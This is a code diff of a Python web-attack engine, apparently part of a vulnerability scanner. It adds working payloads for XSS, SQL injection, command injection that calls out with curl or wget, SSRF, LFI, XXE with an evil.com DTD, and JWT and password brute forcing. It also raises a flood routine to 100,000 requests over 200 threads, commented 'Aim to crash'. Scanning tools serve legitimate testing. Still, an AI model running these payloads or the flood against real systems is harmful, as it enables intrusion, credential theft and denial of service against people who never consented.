@@ -11,16 +11,52 @@ import socket
 import hashlib
 import ssl
 from ..http_client import HttpClient, ResponseWrapper
+import zipfile
+import io
 from ..scenarios import SimpleScenario
+from ..core.logic import FuzzingEngine
+
+fuzzer = FuzzingEngine()
 
 # ==========================================
 # OMNI-ATTACK ENGINE: LOGIC & PAYLOADS
 # ==========================================
 
 def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Advanced DoS: Layer 7 stress testing."""
-    # Placeholder for actual implementation, prevents engine crash
-    return {"scenario_id": scenario.id, "attack_type": "advanced_dos", "passed": True, "details": "Module placeholder - actual logic to be implemented."}
+    """Advanced DoS: Layer 7 stress testing (Slow HTTP POST simulation)."""
+    if not scenario.config.get("aggressive"):
+        return {"scenario_id": scenario.id, "attack_type": "advanced_dos", "passed": True, "details": "Skipped in non-aggressive mode."}
+    
+    print(f"    -> [DOS] Probing Layer 7 stability (Stress Phase)...")
+    
+    # 1. Baseline latency
+    start = time.time()
+    client.send("GET", scenario.target, is_canary=True)
+    baseline = time.time() - start
+    
+    # 2. Simulate High-Payload stress or Slow Body
+    # We use a large dummy body to test server capacity
+    large_body = "A" * 500000 
+    
+    results = []
+    for _ in range(5):
+        try:
+            r = client.send("POST", scenario.target, form_body=large_body, timeout=10)
+            results.append(r.elapsed_ms)
+        except:
+            results.append(10000) # Timeout penalty
+            
+    avg_ms = sum(results) / len(results)
+    stability_degradation = avg_ms / (baseline * 1000) if baseline > 0 else 1
+    
+    status = "VULNERABLE" if stability_degradation > 10 else "SECURE"
+    return {
+        "scenario_id": scenario.id, 
+        "attack_type": "advanced_dos", 
+        "passed": status == "SECURE", 
+        "status": status,
+        "details": f"Stability Degradation Check: Target latency increased by {stability_degradation:.1f}x under Layer 7 stress."
+    }
 
 def run_header_security_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Checks for missing security headers (Clickjacking, MIME, CORS)."""
@@ -62,6 +98,9 @@ def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]
     # AGGRESSIVE TIER: Obfuscated, WAF-evasive, and modern payloads
     if scenario.config.get("aggressive"):
         payloads.extend([
+            "';alert(1)//",
+            "\";alert(1)//",
+            "--></script><script>alert(1)</script>",
             "'\"><img src=x onerror=alert(1)>",
             "<details open ontoggle=alert(1)>",
             "<video><source onerror=alert(1)>",
@@ -146,7 +185,7 @@ def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any
     payload_to_sign = f"{parts[0]}.{parts[1]}"
     secrets = ["secret", "123456", "password", "admin", "dev", "test", "key", "root"]
     
-    issues = []
+    issues, artifacts = [], []
     for s in secrets:
         signature = hmac.new(s.encode(), payload_to_sign.encode(), hashlib.sha256).digest()
         new_token = f"{payload_to_sign}.{base64.urlsafe_b64encode(signature).decode().rstrip('=')}"
@@ -154,9 +193,10 @@ def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any
         resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {new_token}"})
         if resp.status_code == 200 and ("hacker" in resp.text.lower() or "admin" in resp.text.lower()):
             issues.append(f"JWT Weak Secret Confirmed: '{s}'")
+            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
             break
             
-    return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """SQL Injection: Boolean-based, Time-based, and Internal Error Detection."""
@@ -170,9 +210,11 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     # AGGRESSIVE TIER: Time-based, Union, and WAF evasion
     if scenario.config.get("aggressive"):
         payloads.extend([
-            {"p": "'; WAITFOR DELAY '0:0:5'--", "t": "time"},
-            {"p": "' OR SLEEP(5)--", "t": "time"},
-            {"p": "' UNION SELECT 1,2,3,4,5,6--", "t": "union"},
+            {"p": "'; WAITFOR DELAY '0:0:10'--", "t": "time"},
+            {"p": "' OR SLEEP(10)--", "t": "time"},
+            {"p": "') OR pg_sleep(10)--", "t": "time"},
+            {"p": "' UNION SELECT @@version,user(),3,4,5,6--", "t": "union"},
+            {"p": "' UNION SELECT null,table_name,null,null FROM information_schema.tables--", "t": "union"},
             {"p": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "t": "time"},
             {"p": "1' ORDER BY 10--", "t": "error"}
         ])
@@ -193,6 +235,17 @@ def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
             # Probing GET
             resp = client.send("GET", scenario.target, params={field: payload}, is_canary=True)
             duration = resp.elapsed_ms / 1000.0
+            
+            # REINFORCEMENT FEEDBACK: Calculate delta from baseline
+            delta = abs(len(resp.text) - len(baseline_resp.text)) / max(1, len(baseline_resp.text))
+            fuzzer.record_feedback("sql", delta)
+            
+            # ADAPTIVE MUTATION (Aggressive Mode Only)
+            if scenario.config.get("aggressive") and not issues and delta > 0.1:
+                mutant = fuzzer.mutate(payload, "sql")
+                resp = client.send("GET", scenario.target, params={field: mutant}, is_canary=True)
+                duration = resp.elapsed_ms / 1000.0
+                payload = mutant # Update for detection logic below
             
             # 1. Error-based Detection
             err_sigs = ["sql syntax", "unclosed quotation", "mysql_fetch", "sqlite3.Error", "postgresql query failed", "driver failure"]
@@ -242,17 +295,19 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     if scenario.config.get("aggressive"):
         passwords.extend(["12345", "password123", "root", "guest", "1234567"])
 
-    success_creds, lock = [], threading.Lock()
+    success_creds, lock, artifacts = [], threading.Lock(), []
     def check_pwd(pwd):
         resp = client.send("POST", scenario.target, json_body={"username": username, "password": pwd})
         if resp.status_code == 200 and any(k in resp.text.lower() for k in ["token", "success", "profile", "dashboard"]):
-            with lock: success_creds.append(pwd)
+            with lock: 
+                success_creds.append(pwd)
+                artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
 
     limit = 2 if client._is_localhost else 20
     with concurrent.futures.ThreadPoolExecutor(max_workers=limit) as executor:
         executor.map(check_pwd, passwords)
 
-    return {"scenario_id": scenario.id, "attack_type": "brute_force", "passed": not success_creds, "details": f"Credentials Found: {success_creds}" if success_creds else "No weak credentials found."}
+    return {"scenario_id": scenario.id, "attack_type": "brute_force", "passed": not success_creds, "details": f"Credentials Found: {success_creds}" if success_creds else "No weak credentials found.", "artifacts": artifacts}
 
 def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Remote Code Execution: OS Command Injection & Function Injection."""
@@ -263,11 +318,14 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
     if scenario.config.get("aggressive"):
         payloads.extend([
             "import os; os.system('id')",
-            "; curl http://evil.com/`whoami`",
-            "| nslookup `whoami`.evil.com",
             "; sleep 5",
             "<?php system('id'); ?>"
         ])
+        
+        # Inject OOB paylods if available
+        if client.oob_server:
+            # We generate a token but we need to construct the command dynamically inside the loop
+            pass
 
     fields = scenario.config.get("fields", ["id", "cmd", "q", "query"])
     issues, lock = [], threading.Lock()
@@ -279,6 +337,26 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
 
     artifacts = []
     def check_field(field):
+        # 1. OOB Validation (Zero False Positive)
+        if client.oob_server:
+            oob = client.oob_server.generate_payload(context=f"rce_{field}")
+            oob_url = oob["url"]
+            oob_payloads = [
+                f"; curl {oob_url}",
+                f"; wget {oob_url}",
+                f"| curl {oob_url}",
+                f"$(curl {oob_url})"
+            ]
+            for op in oob_payloads:
+                if issues: break
+                client.send("POST", scenario.target, json_body={field: op})
+                if client.oob_server.verify(oob["token"], timeout=1):
+                    with lock:
+                        issues.append(f"RCE CONFIRMED (OOB Callback) in '{field}' -> {op}")
+                        artifacts.append({"request": f"POST {scenario.target} body={field}:{op}", "response": "OOB Callback Received"})
+                    return
+
+        # 2. Standard Heuristics
         for p in payloads:
             if issues: break
             resp = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
@@ -335,7 +413,7 @@ def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         ])
 
     fields = scenario.config.get("fields", ["url", "dest", "webhook", "callback"])
-    issues, lock = [], threading.Lock()
+    issues, lock, artifacts = [], threading.Lock(), []
     limit = 2 if client._is_localhost else 20
 
     # SSRF Detection Logic
@@ -348,22 +426,29 @@ def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
             resp = client.send("POST", scenario.target, json_body={field: p})
             text = resp.text.lower()
             
-            # High-Confidence Indicators
-            indicators = ["ami-id", "instance-id", "root:x:0:0", "ssh-rsa", "metadata-flavor", "computeMetadata"]
-            detected = [i for i in indicators if i in text and i not in baseline]
-            
-            if detected:
-                with lock: issues.append(f"SSRF CONFIRMED in '{field}' -> {p} (Evidence: {detected})")
-                break
+            # OOB Confirmation Logic (Zero False Positive)
+            if client.oob_server:
+                oob_payload = client.oob_server.generate_payload(context=f"ssrf_{field}")
+                # Inject OOB URL
+                resp_oob = client.send("POST", scenario.target, json_body={field: oob_payload["url"]})
                 
+                # Check for immediate confirmation
+                if client.oob_server.verify(oob_payload["token"], timeout=2):
+                    with lock: 
+                        issues.append(f"Blind SSRF CONFIRMED (OOB Callback Received) in '{field}' -> {oob_payload['url']}")
+                        artifacts.append({"request": f"POST {scenario.target} body={field}:{oob_payload['url']}", "response": "OOB Token Verified"})
+                    break
+
             if resp.status_code == 200 and baseline_resp.status_code != 200 and len(resp.text) > 500:
-                with lock: issues.append(f"Potential SSRF (Baseline {baseline_resp.status_code} -> 200 OK) in '{field}'")
+                with lock: 
+                    issues.append(f"Potential SSRF (Baseline {baseline_resp.status_code} -> 200 OK) in '{field}'")
+                    artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                 break
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
         executor.map(check_ssrf, fields)
 
-    return {"scenario_id": scenario.id, "attack_type": "ssrf", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "ssrf", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Local File Inclusion: Traversal and Absolute Pathing."""
@@ -380,16 +465,17 @@ def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
         ])
 
     fields = scenario.config.get("fields", ["file", "page", "path", "doc"])
-    issues = []
+    issues, artifacts = [], []
 
     for field in fields:
         for p in payloads:
             resp = client.send("GET", scenario.target, params={field: p})
             if "root:x:0:0" in resp.text or "[extensions]" in resp.text.lower():
                 issues.append(f"LFI Found in '{field}' with {p}")
+                artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                 break
 
-    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Insecure Direct Object Reference: ID Incrementing and UUID Probing."""
@@ -401,7 +487,7 @@ def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
         id_range.extend(["0", "-1", "9999", "admin", "test"])
 
     from ..utils import StructuralComparator
-    issues, lock = [], threading.Lock()
+    issues, lock, artifacts = [], threading.Lock(), []
     base_target = scenario.target.replace("{{id}}", "ID_PLACEHOLDER")
     
     # BASELINE for IDOR
@@ -415,15 +501,19 @@ def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
         
         # Enhanced Detection: Using Structural Diffing
         if resp.status_code == 200 and baseline.status_code != 200:
-             with lock: issues.append(f"IDOR: Private Resource accessible at ID: {val} (Baseline was {baseline.status_code})")
+             with lock: 
+                 issues.append(f"IDOR: Private Resource accessible at ID: {val} (Baseline was {baseline.status_code})")
+                 artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
         elif resp.status_code == 200 and StructuralComparator.is_significant_delta(baseline.text, resp.text):
              if "error" not in resp.text.lower() and "login" not in resp.text.lower():
-                 with lock: issues.append(f"IDOR: Distinct structural object discovered at ID: {val}")
+                 with lock: 
+                     issues.append(f"IDOR: Distinct structural object discovered at ID: {val}")
+                     artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
         executor.map(check_id, id_range)
 
-    return {"scenario_id": scenario.id, "attack_type": "idor", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "idor", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_nosql_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """NoSQL Injection: MongoDB Operator Abuse."""
@@ -493,7 +583,7 @@ def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         payload = "{{constructor.constructor('return 152399025')()}}"
 
     fields = scenario.config.get("fields", ["name", "q", "comment"])
-    issues = []
+    issues, artifacts = [], []
     
     # BASELINE
     baseline = client.send("GET", scenario.target, params={fields[0]: "BENIGN"}).text
@@ -502,36 +592,53 @@ def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         resp = client.send("GET", scenario.target, params={f: payload})
         if canary in resp.text and canary not in baseline:
             issues.append(f"SSTI detected in '{f}' (Confirmed math evaluation)")
+            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
             break
 
-    return {"scenario_id": scenario.id, "attack_type": "ssti", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "ssti", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_dos_extreme(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Denial of Service: Resource Exhaustion & Stress Test."""
     # FREE TIER: Light stress
-    requests_to_send = 100
+    requests_to_send = 500
+    threads_count = 50
     
-    # AGGRESSIVE TIER: Heavy flood
+    # AGGRESSIVE TIER: Heavy flood - Aim to crash
     if scenario.config.get("aggressive"):
-        requests_to_send = 10000
+        requests_to_send = 100000 
+        threads_count = 200 # High concurrency to overwhelm
 
-    stats, stop_event = {"requests": 0}, threading.Event()
+    stats, stop_event = {"requests": 0, "errors": 0}, threading.Event()
+    
     def flood():
         while not stop_event.is_set() and stats["requests"] < requests_to_send:
             try: 
                 client.send(scenario.method, scenario.target, is_canary=True)
                 stats["requests"] += 1
-            except: pass
+            except: 
+                stats["errors"] += 1
     
-    threads = [threading.Thread(target=flood, daemon=True) for _ in range(50)]
+    threads = [threading.Thread(target=flood, daemon=True) for _ in range(threads_count)]
     for t in threads: t.start()
     
     start = time.time()
-    while time.time() - start < scenario.config.get("duration", 5) and stats["requests"] < requests_to_send:
+    # Sustain attack for longer in aggressive mode
+    duration = 30 if scenario.config.get("aggressive") else 5
+    
+    while time.time() - start < duration and stats["requests"] < requests_to_send:
         time.sleep(0.5)
     
     stop_event.set()
-    return {"scenario_id": scenario.id, "attack_type": "dos_extreme", "passed": True, "details": f"Stress Test: {stats['requests']} requests sent."}
+    
+    # Check impact
+    passed = True
+    details = f"Stress Test: {stats['requests']} requests sent. Errors: {stats['errors']}"
+    
+    if stats["errors"] > (stats["requests"] * 0.5):
+        passed = False
+        details += " (High Error Rate detected - Server likely struggling)"
+        
+    return {"scenario_id": scenario.id, "attack_type": "dos_extreme", "passed": passed, "details": details}
 
 
 def run_xml_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
@@ -551,7 +658,11 @@ def run_xml_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]
 def run_redos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Regular Expression DoS: Catastrophic backtracking probe."""
     # Payload designed to trip O(2^n) regex engines
+    # Payload designed to trip O(2^n) regex engines
     payload = "a" * 100 + "!"
+    if scenario.config.get("aggressive"):
+        payload = "a" * 5000 + "!"
+        
     field = scenario.config.get("fields", ["email", "q"])[0]
     resp = client.send("POST", scenario.target, json_body={field: payload}, timeout=10)
     issues = ["Potential ReDoS detected (Timeout)"] if resp.status_code == 0 or resp.elapsed_ms > 5000 else []
@@ -599,14 +710,58 @@ def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str,
     issues, lock, artifacts = [], threading.Lock(), []
 
     def check_redirect(field):
-        for p in payloads:
+        # Determine destination
+        if client.oob_server:
+            oob = client.oob_server.generate_payload(context=f"open_redirect_{field}")
+            dest_url = oob["url"]
+            dest_domain = urllib.parse.urlparse(dest_url).netloc
+            token = oob["token"]
+        else:
+            dest_url = "http://evil.com"
+            dest_domain = "evil.com"
+            token = None
+
+        local_payloads = [dest_url, f"//{dest_domain}"]
+        if scenario.config.get("aggressive"):
+            local_payloads.extend([
+                f"/%09/{dest_domain}",
+                f"/%5c/{dest_domain}",
+                f"//{dest_domain}/%2f%2e%2e",
+                f"http:{dest_domain}",
+                f"//google.com%2f{dest_domain}"
+            ])
+
+        for p in local_payloads:
             if issues: break
-            resp = client.send("GET", scenario.target, params={field: p})
-            if "evil.com" in resp.url or "google.com" in resp.url or "evil.com" in resp.headers.get("Location", ""):
+            # Aggressive bypass headers specific to this request
+            bypass_headers = {
+                "X-Forwarded-Host": dest_domain,
+                "X-Original-URL": f"/{field}={p}",
+                "X-Rewrite-URL": f"/{field}={p}"
+            }
+            
+            resp = client.send("GET", scenario.target, params={field: p}, headers=bypass_headers, allow_redirects=False)
+            
+            # Evidence collection
+            location = resp.headers.get("Location", "")
+            
+            # 1. OOB Validation (Zero False Positive)
+            if token and client.oob_server.verify(token, timeout=1):
                 with lock:
-                    issues.append(f"Open Redirect in '{field}' -> {p}")
-                    artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+                    issues.append(f"CONFIRMED Open Redirect (OOB Callback) in '{field}' -> {p}")
+                    artifacts.append({"request": resp.request_dump, "response": "OOB Callback Received"})
                 break
+
+            # 2. Strict Header/URL Validation
+            # Check if Location header points to our destination OR if we were redirected there (if allow_redirects was True)
+            if dest_domain in location or dest_domain in resp.url:
+                # Double check to ensure it's not just a reflection or a partial match
+                parsed_loc = urllib.parse.urlparse(location if location else resp.url)
+                if parsed_loc.netloc == dest_domain or dest_domain in location:
+                    with lock:
+                        issues.append(f"CONFIRMED Open Redirect in '{field}' -> {p}")
+                        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+                    break
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
         executor.map(check_redirect, fields)
@@ -674,34 +829,39 @@ def run_swagger_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str,
 def run_git_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Git Repository exposure check."""
     resp = client.send("GET", "/.git/HEAD")
-    issues = ["Exposed .git"] if (resp.status_code == 200 and "refs/heads" in resp.text) else []
-    return {"scenario_id": scenario.id, "attack_type": "git_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    issues, artifacts = [], []
+    if (resp.status_code == 200 and "refs/heads" in resp.text):
+        issues.append("Exposed .git")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "git_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_env_exposure(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Environment file exposure check."""
     resp = client.send("GET", "/.env")
-    issues = ["Exposed .env"] if (resp.status_code == 200 and ("DB_PASS" in resp.text or "API_KEY" in resp.text or "PORT=" in resp.text)) else []
-    return {"scenario_id": scenario.id, "attack_type": "env_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    issues, artifacts = [], []
+    if (resp.status_code == 200 and ("DB_PASS" in resp.text or "API_KEY" in resp.text or "PORT=" in resp.text)):
+        issues.append("Exposed .env")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "env_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_phpinfo(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """phpinfo() exposure check."""
     resp = client.send("GET", "/phpinfo.php")
-    issues = ["Exposed phpinfo()"] if (resp.status_code == 200 and "PHP Version" in resp.text) else []
-    return {"scenario_id": scenario.id, "attack_type": "phpinfo", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    issues, artifacts = [], []
+    if (resp.status_code == 200 and "PHP Version" in resp.text):
+        issues.append("Exposed phpinfo()")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "phpinfo", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
 def run_ds_store(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """DS_Store exposure check."""
     resp = client.send("GET", "/.DS_Store")
-    issues = ["Exposed .DS_Store"] if (resp.status_code == 200 and "Mac OS X" in resp.text) else []
-    return {"scenario_id": scenario.id, "attack_type": "ds_store_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    issues, artifacts = [], []
+    if (resp.status_code == 200 and "Mac OS X" in resp.text):
+        issues.append("Exposed .DS_Store")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "ds_store_exposure", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}
 
-def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Email Header Injection: CRLF in email fields."""
-    payload = "user@test.com%0ABcc:victim@evil.com"
-    field = scenario.config.get("fields", ["email"])[0]
-    resp = client.send("POST", scenario.target, json_body={field: payload})
-    issues = ["Possible Email Header Injection"] if resp.status_code == 200 and "victim@evil.com" in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues}
 
 def run_ldap_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """LDAP Injection: Filter bypass strings."""
@@ -777,13 +937,7 @@ def run_cve_struts2(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     issues = ["Struts2 RCE Confirmed"] if "uid=" in resp.text else []
     return {"scenario_id": scenario.id, "attack_type": "cve_struts2", "passed": not issues, "details": issues}
 
-def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Request Smuggling: CL.TE conflict probe."""
-    try:
-        resp = client.send("POST", scenario.target, headers={"Transfer-Encoding": "chunked", "Content-Length": "4"}, form_body="0\r\n\r\nG", timeout=5)
-        issues = ["Potential Request Smuggling (Timeout/Error)"] if resp.status_code >= 500 or resp.elapsed_ms > 3000 else []
-        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues}
-    except: return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Connection failed."}
+
 
 def run_graphql_introspection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """GraphQL Introspection: Schema extraction."""
@@ -821,46 +975,39 @@ def run_flight_trust_boundary_violation(client: HttpClient, scenario: SimpleScen
     payload = {"__proto__": {"polluted": "true"}, "rsc": "1"}
     resp = client.send("POST", scenario.target, json_body=payload, headers={"Content-Type": "text/x-component", "Next-Action": "12345"})
     
-    issues = []
+    issues, artifacts = [], []
     # Real evidence: Error messages containing server-side paths or flight stream format violations
     if "Flight " in resp.text or "Error: Cannot find module" in resp.text:
          issues.append("RSC Flight Boundary Leak detected (Detailed error message)")
+         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
     elif resp.status_code == 200 and "polluted" in resp.text:
          issues.append("Confirmed Prototype Pollution via Flight Stream")
+         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
          
-    return {"scenario_id": scenario.id, "attack_type": "rsc_flight_trust_boundary_violation", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "rsc_flight_trust_boundary_violation", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_json_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """JSON Bomb: Nested objects recursion."""
     nested = "{}"
-    for _ in range(500): nested = '{"a": ' + nested + '}'
+    depth = 2000 if scenario.config.get("aggressive") else 500
+    for _ in range(depth): nested = '{"a": ' + nested + '}'
     resp = client.send(scenario.method, scenario.target, form_body=nested, headers={"Content-Type": "application/json"})
     issues = ["JSON Recursion Crash"] if resp.status_code >= 500 else []
     return {"scenario_id": scenario.id, "attack_type": "json_bomb", "passed": not issues, "details": issues}
 
-def run_http_desync(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """HTTP Desync: CL.TE obfuscation."""
-    headers = {"Content-Length": "4", "Transfer-Encoding": "chunked"}
-    body = "0\r\n\r\nPOST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\nx="
-    try:
-        resp = client.send(scenario.method, scenario.target, form_body=body, headers=headers)
-        issues = ["Desync Error Response"] if resp.status_code >= 500 else []
-    except: issues = []
-    return {"scenario_id": scenario.id, "attack_type": "http_desync", "passed": not issues, "details": issues}
+
 
 def run_file_upload_abuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """File Upload Abuse: Polyglot extensions."""
     payload = {'file': ('test.php.png', '<?php echo "BRK_RCE"; ?>', 'image/png')}
     resp = client.send("POST", scenario.target, form_body={"submit": "1"})
-    issues = ["Polyglot Upload Accepted"] if resp.status_code == 200 else []
-    return {"scenario_id": scenario.id, "attack_type": "file_upload_abuse", "passed": not issues, "details": issues}
+    issues, artifacts = [], []
+    if resp.status_code == 200:
+        issues.append("Polyglot Upload Accepted")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "file_upload_abuse", "passed": not issues, "details": issues, "artifacts": artifacts}
 
-def run_zip_slip(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
-    """Zip Slip: Traversal in filenames."""
-    payload = {"file": "../../../../etc/passwd", "action": "extract"}
-    resp = client.send("POST", scenario.target, json_body=payload)
-    issues = ["Zip Traversal Accepted"] if "root:x:0:0" in resp.text else []
-    return {"scenario_id": scenario.id, "attack_type": "zip_slip", "passed": not issues, "details": issues}
+
 
 def run_rsc_cache_poisoning(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """RSC Cache Poisoning: Vary header check."""
@@ -873,8 +1020,11 @@ def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str
     """CRLF Injection: Header split probe."""
     payload = "test%0d%0aSet-Cookie:BRK_CRLF=1"
     resp = client.send("GET", scenario.target, params={"q": payload})
-    issues = ["CRLF Success"] if "BRK_CRLF" in resp.headers.get("Set-Cookie", "") else []
-    return {"scenario_id": scenario.id, "attack_type": "crlf_injection", "passed": not issues, "details": issues}
+    issues, artifacts = [], []
+    if "BRK_CRLF" in resp.headers.get("Set-Cookie", ""):
+        issues.append("CRLF Success: Malicious cookie injected via header splitting")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    return {"scenario_id": scenario.id, "attack_type": "crlf_injection", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """Shellshock (CVE-2014-6271): Bash environment variable injection."""
@@ -886,9 +1036,12 @@ def run_shellshock(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
         payload = "() { _; } >_[$($())] { id; }"
 
     resp = client.send("GET", scenario.target, headers={"User-Agent": payload, "Referer": payload})
-    issues = ["Shellshock RCE CONFIRMED: 'id' output detected"] if "uid=" in resp.text else []
+    issues, artifacts = [], []
+    if "uid=" in resp.text:
+        issues.append("Shellshock RCE CONFIRMED: 'id' output detected")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
     
-    return {"scenario_id": scenario.id, "attack_type": "shellshock", "passed": not issues, "details": issues}
+    return {"scenario_id": scenario.id, "attack_type": "shellshock", "passed": not issues, "details": issues, "artifacts": artifacts}
 
 def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """XML External Entity: Local file exfiltration via DOCTYPE."""
@@ -900,9 +1053,16 @@ def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any
         payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.com/x.dtd">%remote;]><a>&exfil;</a>'
 
     resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
-    issues = ["XXE Vulnerability: /etc/passwd contents reflected"] if "root:x:0:0" in resp.text else []
+    issues, artifacts = [], []
     
-    return {"scenario_id": scenario.id, "attack_type": "xxe_exfil", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}
+    if "root:x:0:0" in resp.text or "bin/bash" in resp.text:
+        issues.append("XXE Confirmed: Local file (/etc/passwd) extracted.")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+    elif resp.status_code == 200 and len(resp.text) > 2000:
+        issues.append("Potential Blind XXE: Unexpectedly large response.")
+        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
+        
